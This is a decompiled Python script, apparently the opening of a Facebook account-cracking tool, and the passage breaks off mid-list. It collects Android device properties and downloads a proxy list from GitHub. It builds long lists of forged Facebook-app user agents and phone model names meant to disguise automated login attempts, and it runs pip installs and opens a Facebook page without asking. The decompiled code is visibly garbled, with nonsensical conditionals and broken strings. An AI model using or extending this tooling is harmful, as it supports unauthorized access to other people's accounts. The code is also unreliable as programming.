
# — — — — — — — — — — — — —
# Tool Made By @DARK
# Encoding: Pycdc 3.11
# Decode By @MRSH4MUL
# Channel @NAI
# — — — — — — — — — — — — —

from os import path
import random
import uuid
import string
import hashlib
import json
import uuid
import base64
import requests
import zlib
import httpx
import time
import os
import zlib
import pip
import urllib
import urllib3
import platform
import smtplib
import math
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    print('\n INSTALLING MISSING MODULES ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('xdg-open https://www.facebook.com/copnrt.03')
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
total = 0
for i in fbcr:
    total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    if Exception:
        e = None
        fbcr = 'Zong'
        sim_id += fbcr
        e = None
        del e
        e = None
        del e
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 281.0.0.16.104 (iPhone15,2; iOS 16_2; it_IT; it-IT; scale=3.00; 1179x2556; 470305378) NW/3']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622) NW/3']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622)',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.47 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80',
    'Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022127458',
    'Mozilla/5.0 (Linux; Android 9; Mi A1 Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',
    'Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022131834',
    'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; arm; Android 11; RMX3581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.52.1 YaSearchBrowser/23.52.1 BroPP/1.0 SA/3 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.43',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/23.5.5.333.10 YaApp_iOS/2305.5 YaApp_iOS_Browser/2305.5 Safari/604.1 SA/3',
    'Mozilla/5.0 (Linux; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',
    'Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 GNews Android/2022091362',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Viewer/99.9.7778.79',
    'Mozilla/5.0 (Linux; 13; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11; ms-my; RMX3201 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.3.1.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 Instagram 287.0.0.18.74 (iPhone11,6; iOS 16_5; it_IT; it; scale=3.00; 1242x2688; 483425622) NW/3',
    'Mozilla/5.0 (Linux; Android 8.1.0; 5059D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2918.62 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0; PRA-TL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX3242 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',
    'Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',
    'Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 Vinebre',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 11; SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72468',
    'Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898',
    'Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]']
prox = requests.get('https://raw.githubusercontent.com/Rabeh-Trimix/Chawi/main/.prox.txt').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()
gt = random.choice([
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550\t5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750'])

def UA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205U Build/RKQ1.211103.002) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=1040,height=2439};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    c = ';[Dalvik/2.1.0 (Linux;  U; Android 11.0.1; SM-A205W Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3 75,width=1373,height=1824};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205W;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    d = ';[Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A205FN Build/TP1A.220905.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.25,width=760,height=2422};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    e = ';[Dalvik/2.1.0 (Linux;  U; Android 7.0.1; SM-A205F Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=867,height=1891};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    f = ';[Dalvik/2.1.0 (Linux;  U; Android 9.0.1; SM-A205GN Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1252,height=1991};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205GN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b + c + d + e + f

ua = "Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/316.0.0.1.75;FBPN/com.facebook.lite;FBLC/en_GB;FBBV/566658418;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'+'Davik/2.1.0 (Linux; U; Android 13; Infinix X6525 Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/323.0.0.1.111;FBPN/com.facebook.orca;FBLC/en_CU;FBBV/648505603;FBCR/Ooredoo;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6525;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'+'Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/316.0.0.8.55;FBPN/messenger-android;FBLC/ar_AE;FBBV/240503520;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
gtt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gtt = random.choice([
    'SM-G920F',
    'NRD90M',
    'SM-T535',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'SM-J320F',
    'LMY47V',
    'GT-I9190',
    'KOT49H',
    'GT-N7100',
    'KOT49H',
    'SM-T561',
    'KTU84P',
    'GT-N7100',
    'KOT49H',
    'GT-I9500',
    'LRX22C',
    'SM-J320F',
    'LMY47V',
    'SM-G930F',
    'NRD90M',
    'SM-J320F',
    'LMY47V',
    'SM-J510FN',
    'NMF26X',
    'GT-P5100',
    'IML74K',
    'SM-J320F',
    'LMY47V',
    'GT-N8000',
    'JZO54K',
    'SM-T531',
    'LRX22G',
    'SPH-L720',
    'KOT49H',
    'GT-I9500',
    'JDQ39',
